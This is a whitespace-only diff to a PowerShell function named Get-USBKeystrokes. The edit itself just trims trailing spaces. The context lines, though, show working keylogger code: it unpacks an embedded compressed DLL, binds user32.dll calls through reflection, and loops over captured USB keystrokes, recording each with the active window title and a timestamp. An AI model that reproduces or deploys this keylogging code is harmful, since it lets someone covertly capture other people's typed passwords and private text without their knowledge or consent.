@@ -1,5 +1,5 @@
 
-function Get-USBKeystrokes 
+function Get-USBKeystrokes
 {
     $RemoteScriptBlock = {
     [CmdletBinding()]
@@ -8,7 +8,7 @@ function Get-USBKeystrokes
         [String]
         $CShardDLLBytes
     )
-    
+
     $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($CShardDLLBytes),[IO.Compression.CompressionMode]::Decompress)
     $UncompressedFileBytes = New-Object Byte[](624640)
     $DeflatedStream.Read($UncompressedFileBytes, 0, 624640) | Out-Null
@@ -56,7 +56,7 @@ jHgFWFVN1/ahDt3dJQ3S3SEd0t2dh04BkVIJCUkJQVK6pURQQKRTpATpkg7Jfx/A53l5v7/2xc2edc/M
             $False,
             $True,
             [Runtime.InteropServices.CallingConvention]::Winapi,
-            [Runtime.InteropServices.CharSet]::Auto 
+            [Runtime.InteropServices.CharSet]::Auto
         )
         $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
         $PInvokeMethod.SetCustomAttribute($CustomAttribute)
@@ -73,8 +73,8 @@ jHgFWFVN1/ahDt3dJQ3S3SEd0t2dh04BkVIJCUkJQVK6pURQQKRTpATpkg7Jfx/A53l5v7/2xc2edc/M
         $key = ""
         while($true)
         {
-            
-            if ($ETWLogger.keysPressed.Count -ne 0)   
+
+            if ($ETWLogger.keysPressed.Count -ne 0)
             {
                 #Only process window data if there's a key press
                 $TopWindow = $ImportDll::GetForegroundWindow()
@@ -86,7 +86,7 @@ jHgFWFVN1/ahDt3dJQ3S3SEd0t2dh04BkVIJCUkJQVK6pURQQKRTpATpkg7Jfx/A53l5v7/2xc2edc/M
                     $LastWindowTitle = $WindowTitle
                 }
 
-                $c = $ETWLogger.keysPressed.Dequeue()         
+                $c = $ETWLogger.keysPressed.Dequeue()
                 $c = $c -replace "([0-9A-Z]{2}\s*){8}\t\t", ""
                 if ($c -eq "[RET]")
                 {
@@ -102,13 +102,13 @@ jHgFWFVN1/ahDt3dJQ3S3SEd0t2dh04BkVIJCUkJQVK6pURQQKRTpATpkg7Jfx/A53l5v7/2xc2edc/M
                 {
                     $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss)
                     "`n[=== $LastWindowTitle - $TimeStamp ===]`n$key`n"
-                    $key = ""   
+                    $key = ""
                 }
                 else
                 {
                     $key += $c
                 }
-                
+
             }
             Start-Sleep -Milliseconds 100
         }
@@ -117,5 +117,5 @@ jHgFWFVN1/ahDt3dJQ3S3SEd0t2dh04BkVIJCUkJQVK6pURQQKRTpATpkg7Jfx/A53l5v7/2xc2edc/M
     {
         "Exception during run: $($_.Exception.Message)`n"
     }
-    
+
 }
